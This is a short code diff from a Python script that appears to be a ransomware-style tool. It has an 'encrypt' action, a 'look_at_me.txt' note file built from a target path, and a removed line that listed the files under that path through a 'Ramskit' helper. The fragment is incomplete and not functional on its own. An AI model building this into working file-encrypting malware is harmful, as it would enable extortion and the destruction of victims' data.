@@ -38,7 +38,6 @@ if __name__ == '__main__':
     action = args.action.lower()
     path = args.path
 
-    items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
     lam = os.path.join(path, 'look_at_me.txt')
 
     if action == 'encrypt':
